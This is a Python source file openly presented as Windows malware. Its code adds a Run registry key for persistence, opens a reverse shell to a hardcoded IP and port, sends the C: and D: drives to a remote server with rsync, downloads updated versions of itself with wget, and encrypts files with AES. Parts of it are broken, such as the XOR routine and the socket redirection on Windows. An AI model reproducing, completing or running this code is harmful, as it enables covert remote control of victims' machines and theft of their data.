import os
import subprocess
import socket
import tempfile
import logging
from winreg import *
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

MALWARE_NAME = "malware.exe"
TRIGGER = MALWARE_NAME.replace('.exe', '') + ".vbs"
KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
KEY_NAME = "anarc0der_key"
REV_SHELL = "192.168.1.106"
SHELL_PORT = 4444
TRIGGER_PATH = os.path.join(tempfile.gettempdir(), TRIGGER)
MALWARE_PATH = os.path.join(tempfile.gettempdir(), MALWARE_NAME)

# Configuration for logging system
logging.basicConfig(filename=os.path.join(tempfile.gettempdir(), 'malware_log.txt'), level=logging.DEBUG)

class MyMalware:
    def __init__(self):
        self.encryption_key = os.urandom(32)  # 256-bit key
        self.destination_dir = "korisnik@adresa_servera:/putanja/do/odredjenog/mesta"

    def xor_encrypt_decrypt(self, data):
        """Encrypt or decrypt data using XOR cipher."""
        encrypted_data = bytearray()
        for byte in data:
            encrypted_data.append(byte ^ self.encryption_key)
        return bytes(encrypted_data)

    def aes_encrypt_file(self, file_path):
        """Encrypt a file using AES cipher."""
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.encryption_key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        
        with open(file_path + '.enc', 'wb') as f:
            f.write(iv + ciphertext)

    def aes_decrypt_file(self, file_path):
        """Decrypt a file encrypted with AES cipher."""
        with open(file_path, 'rb') as f:
            ciphertext = f.read()
        
        iv = ciphertext[:16]
        ciphertext = ciphertext[16:]
        cipher = Cipher(algorithms.AES(self.encryption_key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        with open(file_path[:-4], 'wb') as f:
            f.write(plaintext)

    def save_encryption_key(self, key_path):
        """Save encryption key to a file."""
        with open(key_path, 'wb') as f:
            f.write(self.encryption_key)

    def load_encryption_key(self, key_path):
        """Load encryption key from a file."""
        with open(key_path, 'rb') as f:
            self.encryption_key = f.read()

    def infect_windows_register_keys(self):
        """Infect Windows registry keys with malware."""
        keys = []
        with OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH) as key:
            try:
                i = 0
                while True:
                    cur_key = EnumValue(key, i)
                    keys.append(cur_key[0])
                    i += 1
            except OSError:
                pass
        if KEY_NAME not in keys:
            with OpenKey(HKEY_LOCAL_MACHINE, KEY_PATH, 0, KEY_SET_VALUE) as mlwr_key:
                encrypted_code = self.xor_encrypt_decrypt(b"self.reverse_shell_function()")
                SetValueEx(mlwr_key, KEY_NAME, 0, REG_SZ, TRIGGER_PATH)
                logging.info(f"Malware added to Windows registry.")
            return False
        return True
    
    def reverse_shell_function(self):
        """Establish reverse shell connection to malicious server."""
        try:
            # Establish connection to malicious server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((REV_SHELL, SHELL_PORT))
            
            # Redirect input, output, and errors to the socket
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            
            # Execute shell command
            subprocess.call(["cmd.exe"])
        except Exception as e:
            logging.error(f"Error in reverse shell: {e}")

    def copy_disks_to_server(self):
        """Copy disks C and D to a server using rsync."""
        # Source disks to copy
        source_disks = ["C:/", "D:/"]

        for disk in source_disks:
            # Execute rsync command to copy disk to server
            subprocess.run(["rsync", "-avz", disk, self.destination_dir])

    def auto_update_malware(self):
        """Automatically update malware to the latest version."""
        try:
            # Example: Downloading new version of malware from server
            subprocess.run(["wget", "http://server_address/malware.exe", "-O", "new_version_malware.exe"])
            
            # Example: Replacing current version of malware with the new one
            os.replace("new_version_malware.exe", MALWARE_PATH)
            logging.info("Malware successfully updated.")
        except Exception as e:
            logging.error(f"Error updating malware: {e}")

    def main(self):
        """Main function to execute malware functionalities."""
        if self.infect_windows_register_keys():
            self.reverse_shell_function()
            self.copy_disks_to_server()
            self.save_encryption_key('encryption_key.bin')
            # If you want to use a previously saved key
            # self.load_encryption_key('encryption_key.bin')
            # If you want to decrypt files after sending
            # self.aes_decrypt_file('encrypted_file.enc')

if __name__ == '__main__':
    x = MyMalware()
    x.main()
